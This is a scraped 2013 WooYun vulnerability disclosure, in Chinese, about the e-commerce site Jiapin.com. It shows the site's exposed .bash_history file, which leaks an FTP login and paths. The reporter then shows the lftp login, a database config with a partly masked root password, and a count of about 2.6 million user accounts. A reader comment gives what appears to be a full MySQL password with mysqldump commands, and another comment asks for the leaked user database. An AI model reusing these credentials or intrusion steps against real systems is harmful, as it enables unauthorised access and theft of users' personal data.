{"id": 7122, "wybug_id": "wooyun-2013-046857", "wybug_title": "佳品网敏感信息泄露导致服务器沦陷(可影响数百万用户信息)", "wybug_corp": "佳品网", "wybug_author": "猪猪侠", "wybug_date": "2013-12-23 23:49", "wybug_open_date": "2013-12-28 23:49", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露", "错误信息未屏蔽", "用户敏感信息泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-28：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 由于没有一个通用标准的防御规则保护好中间件配置信息、DNS信息、业务数据信息、用户信息、源码备份文件、版本管理工具信息、系统错误信息和敏感地址信息(后台或测试地址)的泄露，攻击者可能会通过收集这些保护不足的数据，利用这些信息对系统实施进一步的攻击。 详细说明：  #1 信息泄露原因由于佳品网管理员在设置HTTPD中间件管理用户的主目录时，未注意到bash会默认创建各种.bash_history、.bash_profile文件用来生成对应的SHELL环境，从而造成了更严重的信息安全问题。#2 泄露内容网站: http://119.254.82.134泄露文件：http://119.254.82.134/.bash_history#3 泄露内容\nchmod -R 777 index.phpcat index.phpcat index.php| errorcat index.php|grep errorvi index.php.3 vim bootstrap.phpexitcd vipstore.com2/cd html/cat index.php| grep errorcat index.php| grep tryvi index.phpvi index.php.3 vi index.phpvi index.phpexitcd goods/cd html/vi ../../vipstore.com2/html/bootstrap.phpvi ../../vipstore.com2/html/bootstrap.phpcd goods/cd html/cd config/vi config.ini cd ht/html/cd goods/cd html/cd vipstore.com2/cd html/cat bootstrap.phpcd www/cd goods/cd html/cd -pwdcd vipstore.com2/cd html/cd goods/cd config/vi config.ini cd htvi ../html/bootstrap.phpexitcd vipstore.com2/cd application/admin/cd controllers/vi KilqlController.php exitcd vipstore.com2/cd application/user/cd admin/cd controllers/vi KilqlController.php su ftpusersu ftpusercd vipstore.com2/application/admin/controllers/vimdiff KilqlController.php KilqlController.php.bak cd mode/vi KilqlModel.php KilqlModel.phpcd -cd controllers/vi KilqlController.phpvi KilqlController.php/mode/vi KilqlModel.php vi KilqlModel.php cd -vi KilqlController.phpvi KilqlController.phpvi KilqlController.phpexitcd fleet_upload/cd task/vim mv_project_file_to_online_path.sh llcd f_1337761972/llllll f*/cd task/ksrm f_1337* -rfcd task/cd fleet_upload/task/vi mv_project_file_to_online_path.sh exitcd fleet_upload/cd task/cd f_1337826*pwdllcdcd fleet_upload/cd fleet_upload/llchmod -R 777chmod -R 777 ./chmod -R 777 ..//chmod -R 777 fleet_upload/cd fleet_upload/cd f_1337826921/lftp -u www,^*******7*UHB ffttpp.vipstore.comexitcd fleet_upload/rm f_13378* -rfcd task/cd vipstore.com2/rm -rf procedure/ordercd -cd www/cd fleet_upload/cd task/cd task/cd f_1337841923//../vipstore.com2/procedure/cd -rm f_1337841923/ -rfkswatch -n 0.1 \"ll\"watch -n 0.1 \" ./\"watch -n 0.1 \"find ./ *\"vi task/mv_project_file_to_online_path.sh cd task/cat task.shcat task.shcat task.sh *cd task/cd f_1337842643/task/watch -n 0.1 \"\"pwdrm f_1337842* -rfwatch -n 0.1 \"\"lsrm f_1337842858/ -rfcd task/cat task.sh cat task.sh exitcd vipstore.com2/cd fleet_upload/cd task/cat task.sh cd f_1337855455/cd task/rm -rf task/cd task/cat task.sh cd f_1337856806/cd task/rm 1337856* -rfvi mv_project_file_to_online_path.sh rm f_133785* -rfwatch -n 0.1 \"\"cd /www/vipstore.com2/procedure/order/cd vipstore.com2/cd application/cd mcd controllers/mv Iphonemember\n   漏洞证明：  #4 漏洞利用泄露的信息中包含了某服务器的SSH用户名、密码，可远程连接\nlftp -u www,^*******7*UHB ffttpp.vipstore.com\n\n\n\n\n#5 查看数据库配置文件，并连接数据库cat /vipstore.com/config/config.ini\n[default]; 站点设置www.host    = localhostwww.baseurl = /; xml数据文件data.file   = data/departments.xmlmenu.file\t= data/menu.xml; 数据连接设置db.adapter  = PDO_MYSQLdb.dbname   = vipstore2db.hostname = 10.0.111.195db.username = rootdb.password = 6yh****7db.profiler = true; Debug 模式debug       = onconfig\t\t= on;cache 设置cache.lifetime = 72000cache.automatic_Serialization = true;session 设置session.remember_me_seconds = 86400000 //10天会话标识符还将保存在cookie中的时长session.use_only_cookies = on;admin_log 管理员日志log.addgroup = 添加角色log.editgroup = 编辑角色:log.menu = 添加菜单log.editmenu = 编辑菜单:log.user = 添加管理员log.edituser = 编辑用户:log.addcredit = 添加积分规则:log.editcredit = 编辑积分规则:log.additem = 添加标签项：log.addtag = 添加标签：log.edititem = 编辑标签项：log.edittag = 编辑标签：log.detaidel = 删除最终标签log.addvir = 添加虚拟账户获取规则:log.editvir = 编辑虚拟账户获取规则:\n#6 访问到敏感的用户数据\nSELECT COUNT(*) FROM `user_member`2639889\n\n\n   修复方案：  #1 网络边界需要认真对待#2 杜绝为了方便而造成的不必要的信息泄露#3 安全是一个整体，保证安全不在于强大的地方有多强大，而在于真正薄弱的地方在哪里   版权声明：转载请注明来源 猪猪侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-12-28 23:49 厂商回复：  漏洞Rank：8  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-23 23:55 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  要不要这么淫荡啊    \n     2013-12-24 00:13 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:2738 漏洞数:547        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  @小胖子   R啊。。。。。。    \n     2013-12-24 09:19 |    \t\tflywin \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:1        | 有好的安卓或者IOS远程控制的请联系我，RMB...)\t\t \n  有裤子发给我一份    \n     2013-12-25 19:29 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  无影响，厂商忽略！    \n     2013-12-29 13:28 |    \t\tinsight-labs  \t\t\t( 普通白帽子  |\t\t\t        Rank:623 漏洞数:75        | Security guys)\t\t \n  mysql -uslave -p6yhnmju7 -h 10.0.111.194historylllocate 2.sqlcd /www/help/llll -hsllpwdmysqldump -u www -p vipstore2 -h 10.0.111.195 > 2.sqlmysqldump -u slave -p 6yhnmju7 -h 10.0.111.194 > 2.sqlmysqldump -uslave -p6yhnmju7 -h 10.0.111.194 > 2.sqlmysqldump -uslave -p6yhnmju7 -h 10.0.111.194 vipstore2> 2.sqlmysql -uslave -p6yhnmju7 -h 10.0.111.194目测已被数人拖过……    \n     2013-12-29 23:32 |    \t\ttxcbg \t\t\t( 普通白帽子  |\t\t\t        Rank:391 漏洞数:53        | 说点什么呢？)\t\t \n  姿势够淫荡的啊    \n     2013-12-30 00:15 |    \t\tn3wF \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        )\t\t \n  \"由于佳品网管理员在设置HTTPD中间件管理用户的主目录时\"，这个是不是就是说把站点目录设置成了用户目录，或者说把虚拟目录设置成了用户目录就会造成这种泄漏？    \n     2013-12-30 09:47 |    \t\tfeng \t\t\t( 普通白帽子  |\t\t\t        Rank:664 漏洞数:79        | 想刷个6D)\t\t \n  猪哥总是给人惊喜    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}